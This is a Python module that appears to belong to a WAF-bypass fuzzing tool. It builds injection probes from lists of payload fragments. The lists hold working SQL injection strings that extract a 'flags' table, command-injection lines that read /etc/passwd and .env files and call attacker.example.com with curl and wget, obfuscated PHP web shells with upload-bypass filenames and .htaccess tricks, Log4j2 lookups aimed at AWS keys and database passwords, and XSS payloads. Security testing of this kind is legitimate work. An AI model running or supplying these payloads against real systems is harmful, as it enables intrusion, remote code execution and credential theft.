"""语句合成器 — 从语法部件系统组合新语句（结构性生成）。

与 generator（种子突变）不同：composer 不依赖种子，直接从"语句骨架 × 语法部件"
组合出**从未见过的语句**，解决"样本永远是一句话的变体"的架构缺陷。

用法:
  from lib import composer
  probes = composer.compose_probes("sqli", count=30)

输出: 与 AI 探针同构的 dict 列表（payload / mechanism.primitives / generation.reason），
可直接作为 run_round 的 Layer-1 种子参与派生与实测。
"""
import itertools

# ── sqli 语法部件 ─────────────────────────────────────────────

SQLI_FUNCS = [
    "SLEEP(5)", "BENCHMARK(1000000,MD5(1))", "GET_LOCK('x',5)", "IS_FREE_LOCK('x')",
    "EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)))",
    "UPDATEXML(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)),1)",
    "GTID_SUBSET(CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)),1)",
    "ST_X(POINT((SELECT 1 FROM flags),1))",
    "JSON_KEYS((SELECT JSON_OBJECT('a',1)))",
    "UUID()", "ROW_COUNT()", "FOUND_ROWS()", "@@version", "@@datadir",
    "(SELECT COUNT(*) FROM flags WHERE flag REGEXP 0x5e666c6167)",
    "ELT((SELECT 1),1,2)", "FIELD((SELECT 1),1,2,3)",
    "FIND_IN_SET((SELECT 1),'1,2')",
    "(SELECT SUBSTRING(flag,1,1) FROM flags LIMIT 1)='f'",
    "(SELECT CAST(flag AS CHAR) FROM flags LIMIT 1) REGEXP 0x5e666c6167",
    "greatest(ascii(mid((SELECT flag FROM flags LIMIT 1) from 1 for 1)),150)=150",
    "(SELECT 1 FROM flags LIMIT 1)<=>1",
]
SQLI_OPERATORS = ["AND", "OR", "AND/**/", "OR/**/", "%0aAND%0a", "%09AND%09", "&&", "||"]
SQLI_BASES = ["1", "-1", "0", "1'"]
SQLI_STATEMENT_SKELETONS = [
    "-1 UNION TABLE flags LIMIT 1,2",
    "-1 UNION VALUES ROW(1,2,3)",
    "WITH c AS (SELECT 1 FROM flags) SELECT * FROM c",
    "DO (SELECT SLEEP(3))",
    "1 AND (SELECT * FROM flags EXCEPT SELECT * FROM flags)",
    "1 AND (SELECT * FROM flags INTERSECT SELECT * FROM flags)",
    "HANDLER flags OPEN",
    "1 AND (SELECT flag FROM flags LIMIT 1) REGEXP 0x5e666c6167",
    "1 AND (SELECT 1 FROM flags WHERE flag REGEXP 0x666c6167 LIMIT 1)",
    "1 AND (SELECT COUNT(*) FROM flags)",
]

# ── cmdi 语法部件 ─────────────────────────────────────────────

CMDI_READS = [
    "/etc/hostname", "/etc/passwd", "/etc/motd", "/proc/self/environ",
    "/etc/resolv.conf", "/srv/app/.env",
]
CMDI_INTERPRETERS = [
    "awk '//' {f}", "sed -n '1,3p' {f}", "perl -e 'print `cat {f}`'",
    "php -r 'echo file_get_contents(\"{f}\");'",
    "python3 -c 'print(open(\"{f}\").read())'",
    "node -e 'console.log(require(\"fs\").readFileSync(\"{f}\"))'",
]
CMDI_OOB = [
    "curl http://attacker.example.com/$(hostname)",
    "nslookup attacker.example.com",
    "wget http://attacker.example.com/$(uname -a)",
]
CMDI_SIDE = [
    ";mkdir /tmp/waf_$(hostname)", ";touch /tmp/waf_pwned_2026",
    ";chmod 777 /tmp; id > /tmp/waf_uid",
    ";echo $(<{f})", ";{id;}", ";IFS=.;read -ra x <<<\"a.b\";echo ${x[1]}",
    "printf '%s\\n' {f} | xargs cat",
    "bash -c 'exec 3<>/dev/tcp/127.0.0.1/80'",
    ";uname -a", ";env",
]


def _probe(payload, scenario, prim_id, layer, reason, overall="medium"):
    return {
        "payload": payload, "scenario": scenario, "category": "semantic_bypass",
        "mechanism": {"layers": [layer], "primitives": [{"id": prim_id}],
                      "encodings": [], "summary": reason[:40]},
        "generation": {"source": "composer", "reason": reason},
        "quality": {"overall": overall},
    }


def compose_sqli(count=30):
    """函数 × 运算符 × 基值 → 新语句；再加语句骨架。"""
    out = []
    seen = set()
    # 1. 函数表达式 × 运算符 × 基值
    for base, op, fn in itertools.product(SQLI_BASES, SQLI_OPERATORS, SQLI_FUNCS):
        if len(out) >= count:
            break
        payload = "%s %s %s" % (base, op, fn)
        if payload in seen:
            continue
        seen.add(payload)
        out.append(_probe(payload, "sqli", "sqli:semantic:time_blind",
                          "semantic", "语句合成：%s %s %s" % (base, op, fn.split("(")[0].upper())))
    # 2. 语句骨架（结构性新语句）
    for s in SQLI_STATEMENT_SKELETONS:
        if len(out) >= count:
            break
        if s in seen:
            continue
        seen.add(s)
        out.append(_probe(s, "sqli", "sqli:syntactic:query_restructure",
                          "syntactic", "语句合成：%s" % s[:50]))
    return out[:count]


def compose_cmdi(count=30):
    """解释器 × 读文件 + OOB + 副作用 + 新构造。"""
    out = []
    seen = set()
    # 解释器 × 文件
    for tpl in CMDI_INTERPRETERS:
        for f in CMDI_READS:
            if len(out) >= count:
                break
            payload = tpl.format(f=f)
            if payload in seen:
                continue
            seen.add(payload)
            out.append(_probe(payload, "cmdi", "cmdi:syntactic:interp_read",
                              "syntactic", "语句合成：解释器读取 %s" % f))
    # OOB + 副作用 + 新构造
    for payload in CMDI_OOB + CMDI_SIDE:
        if len(out) >= count:
            break
        if payload in seen:
            continue
        seen.add(payload)
        prim = "cmdi:semantic:oob" if "curl" in payload or "nslookup" in payload else "cmdi:syntactic:logical_chain"
        layer = "semantic" if "oob" in prim else "syntactic"
        out.append(_probe(payload, "cmdi", prim, layer, "语句合成：%s" % payload[:50]))
    return out[:count]


# ── upload 语法部件 ──────────────────────────────────────────

UPLOAD_EXTENSIONS = ["shell.phtml", "shell.phar", "shell.php5", "shell.pht",
                     "shell.php.jpg", "shell.jpg.php", "shell.pHp", "shell.php.",
                     "shell.php%00.jpg", "shell.asp;.jpg"]
UPLOAD_CONTENTS = [
    "GIF89a<?php $f='sy'.'stem';$f($_GET[1]);?>",
    "<?PHP system($_GET[c]);?>",
    "$f=strrev('metsys');$f($_GET[1]);",
    "<?php $a=$_GET['a'];@$a($_GET['b']);?>",
    "<?=$_GET[1]?>",
]
UPLOAD_CONFIGS = [".htaccess AddType application/x-httpd-php .jpg",
                  ".user.ini auto_prepend_file=2.png"]
UPLOAD_MULTIPART = ["filename=\"safe.txt\"; filename*=utf-8''shell.php",
                    "filename=\"a.jpg;filename=b.php\""]


def compose_upload(count=30):
    out, seen = [], set()
    for p in UPLOAD_EXTENSIONS + UPLOAD_CONTENTS + UPLOAD_CONFIGS + UPLOAD_MULTIPART:
        if len(out) >= count or p in seen:
            continue
        seen.add(p)
        prim = "upload:ext:alt-php" if "." in p and "php" in p.lower() and "<" not in p else "upload:content:short_tag"
        if p.startswith("."): prim = "upload:config:htaccess"
        if "filename" in p: prim = "upload:multipart:filename_star_conflict"
        layer = "extension" if prim.startswith("upload:ext") else "content"
        out.append(_probe(p, "upload", prim, layer, "语句合成：%s" % p[:50]))
    return out[:count]


# ── log4j2 语法部件 ──────────────────────────────────────────

LOG4J2_LOOKUPS = [
    "bundle:application:spring.datasource.password",
    "bundle:application:spring.datasource.username",
    "bundle:config:server.port",
    "env:HOST", "env:PATH", "env:AWS_ACCESS_KEY_ID", "env:AWS_SECRET_ACCESS_KEY",
    "sys:java.version", "sys:user.name",
    "ctx:loginId", "main:app.name", "java:os", "java:vm",
    "date:MM-dd-yyyy", "lower:JNDI", "upper:jndi",
]
LOG4J2_PREFIX = ["${", "${${a:-b}", "${${lower:", "${${::-"]


def compose_log4j2(count=30):
    out, seen = [], set()
    for pre, key in itertools.product(LOG4J2_PREFIX, LOG4J2_LOOKUPS):
        if len(out) >= count:
            break
        if pre == "${":
            payload = "${%s}" % key
        elif pre == "${${a:-b}":
            payload = "${${a:-b}%s}" % key[5:] if key.startswith("bundle") else None
            if payload is None: continue
        elif pre == "${${lower:":
            payload = "${${lower:%s}" % key if not key.startswith("lower") else None
            if payload is None: continue
        else:
            payload = "${${::-j}ndi:%s}" % key
        if not payload or payload in seen:
            continue
        seen.add(payload)
        prim = "log4j2:lookup:info_disclosure" if any(k in key for k in ("bundle", "env", "sys", "ctx", "main", "java")) else "log4j2:lookup:lower_upper"
        out.append(_probe(payload, "log4j2", prim, "lookup", "语句合成：%s" % payload[:50]))
    return out[:count]


# ── xss 语法部件 ─────────────────────────────────────────────

XSS_TAG_EVENTS = [
    "<svg/onload=alert(1)>", "<details open ontoggle=alert(1)>",
    "<img src=x onerror=alert(1)>", "<body onpageshow=alert(1)>",
    "<input autofocus onfocus=alert(1)>", "<marquee onstart=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>",
    "<video src=x onerror=alert(1)>",
]
XSS_OBF = [
    "<div style=\"scroll-snap-type:y;overflow-y:scroll;height:200px\" data-x=\"innerHTML\" data-y=\"PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+\" onscrollsnapchanging=\"this[this.dataset.x]=atob(this.dataset.y)\"></div>#auto",
    "<svg><script xlink:href=\"data:text/javascript,alert(1)\"></script></svg>",
    "<img src=x onerror=prompt&#x28;document.domain&#x29;>",
]


def compose_xss(count=30):
    out, seen = [], set()
    for p in XSS_TAG_EVENTS + XSS_OBF:
        if len(out) >= count or p in seen:
            continue
        seen.add(p)
        prim = "xss:context:event_more" if p.startswith("<") else "xss:context:svg_xlink_data_script"
        out.append(_probe(p, "xss", prim, "context", "语句合成：%s" % p[:50]))
    return out[:count]


def compose_probes(scenario, count=30):
    """场景 → 合成探针列表。"""
    return {
        "sqli": compose_sqli,
        "cmdi": compose_cmdi,
        "upload": compose_upload,
        "log4j2": compose_log4j2,
        "xss": compose_xss,
    }.get(scenario, lambda c: [])(count)
